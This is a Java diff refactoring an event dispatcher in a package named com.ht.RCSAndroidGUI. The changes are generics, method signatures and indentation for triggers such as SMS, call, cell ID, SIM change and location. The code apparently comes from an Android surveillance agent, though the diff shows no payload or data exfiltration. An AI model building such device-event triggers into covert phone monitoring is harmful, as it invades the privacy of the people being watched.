@@ -14,6 +14,8 @@ import java.util.Map;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Manager;
+import com.ht.RCSAndroidGUI.agent.AgentBase;
+import com.ht.RCSAndroidGUI.agent.AgentType;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.util.Check;
 
@@ -21,7 +23,7 @@ import com.ht.RCSAndroidGUI.util.Check;
 /**
  * The Class EventManager.
  */
-public class EventManager extends Manager {
+public class EventManager extends Manager<EventBase, Integer> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventManager";
 
@@ -61,63 +63,63 @@ public class EventManager extends Manager {
 		}
 
 		switch (type) {
-		case EVENT_TIMER:
-			Log.d("QZ", TAG + " Info: " + "");
-			e = new TimerEvent();
-			break;
+			case EVENT_TIMER:
+				Log.d("QZ", TAG + " Info: " + "");
+				e = new TimerEvent();
+				break;
 
-		case EVENT_SMS:
-			Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
-			break;
+			case EVENT_SMS:
+				Log.d("QZ", TAG + " Info: " + "EVENT_SMS");
+				break;
 
-		case EVENT_CALL:
-			Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
-			break;
+			case EVENT_CALL:
+				Log.d("QZ", TAG + " Info: " + "EVENT_CALL");
+				break;
 
-		case EVENT_CONNECTION:
-			Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
-			break;
+			case EVENT_CONNECTION:
+				Log.d("QZ", TAG + " Info: " + "EVENT_CONNECTION");
+				break;
 
-		case EVENT_PROCESS:
-			Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
-			break;
+			case EVENT_PROCESS:
+				Log.d("QZ", TAG + " Info: " + "EVENT_PROCESS");
+				break;
 
-		case EVENT_CELLID:
-			Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
-			e = new CellIdEvent();
-			break;
+			case EVENT_CELLID:
+				Log.d("QZ", TAG + " Info: " + "EVENT_CELLID");
+				e = new CellIdEvent();
+				break;
 
-		case EVENT_QUOTA:
-			Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
-			break;
+			case EVENT_QUOTA:
+				Log.d("QZ", TAG + " Info: " + "EVENT_QUOTA");
+				break;
 
-		case EVENT_SIM_CHANGE:
-			Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
-			break;
+			case EVENT_SIM_CHANGE:
+				Log.d("QZ", TAG + " Info: " + "EVENT_SIM_CHANGE");
+				break;
 
-		case EVENT_LOCATION:
-			Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
-			e = new LocationEvent();
-			break;
+			case EVENT_LOCATION:
+				Log.d("QZ", TAG + " Info: " + "EVENT_LOCATION");
+				e = new LocationEvent();
+				break;
 
-		case EVENT_AC:
-			Log.d("QZ", TAG + " Info: " + "EVENT_AC");
-			e = new AcEvent();
-			break;
+			case EVENT_AC:
+				Log.d("QZ", TAG + " Info: " + "EVENT_AC");
+				e = new AcEvent();
+				break;
 
-		case EVENT_BATTERY:
-			Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
-			e = new BatteryEvent();
-			break;
+			case EVENT_BATTERY:
+				Log.d("QZ", TAG + " Info: " + "EVENT_BATTERY");
+				e = new BatteryEvent();
+				break;
 
-		case EVENT_STANDBY:
-			Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
-			e = new StandbyEvent();
-			break;
+			case EVENT_STANDBY:
+				Log.d("QZ", TAG + " Info: " + "EVENT_STANDBY");
+				e = new StandbyEvent();
+				break;
 
-		default:
-			Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
-			break;
+			default:
+				Log.d("QZ", TAG + " Error: " + "Unknown: " + type);
+				break;
 		}
 
 		if (e != null) {
@@ -151,19 +153,19 @@ public class EventManager extends Manager {
 
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventConf> pairs = it.next();
-			
+
 			final EventConf conf = pairs.getValue();
 			final EventType type = conf.getType();
 			Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
-			
+
 			final EventBase e = factory(type, conf.getId());
 
 			if (e != null) {
 				e.parse(conf);
-				
+
 				if (e.getStatus() != EventConf.EVENT_RUNNING) {
 					final Thread t = new Thread(e);
-					if(Configuration.DEBUG){
+					if (Configuration.DEBUG) {
 						t.setName(e.getClass().getSimpleName());
 					}
 					t.start();
@@ -193,7 +195,7 @@ public class EventManager extends Manager {
 
 			if (event.getStatus() == EventConf.EVENT_RUNNING) {
 				event.stopThread();
-				
+
 				try {
 					final Thread t = (Thread) threads.get(event);
 					Check.asserts(t != null, "Null thread");
@@ -206,34 +208,27 @@ public class EventManager extends Manager {
 					Log.d("QZ", TAG + " Error: " + e.toString());
 				}
 			} else {
-				Check.asserts(threads.get(event) == null,
-						"Shouldn't find a thread");
+				Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
 			}
 
 		}
-		
+
 		Check.ensures(threads.size() == 0, "Non empty threads");
 		Check.ensures(running.size() == 0, "Non empty running");
-		
+
 		running.clear();
 		threads.clear();
 	}
 
-	/* (non-Javadoc)
-	 * @see com.ht.RCSAndroidGUI.Manager#start(int)
-	 */
 	@Override
-	public void start(int key) {
+	public void start(Integer key) {
 		// TODO Auto-generated method stub
-		
+
 	}
 
-	/* (non-Javadoc)
-	 * @see com.ht.RCSAndroidGUI.Manager#stop(int)
-	 */
 	@Override
-	public void stop(int key) {
+	public void stop(Integer key) {
 		// TODO Auto-generated method stub
-		
+
 	}
 }
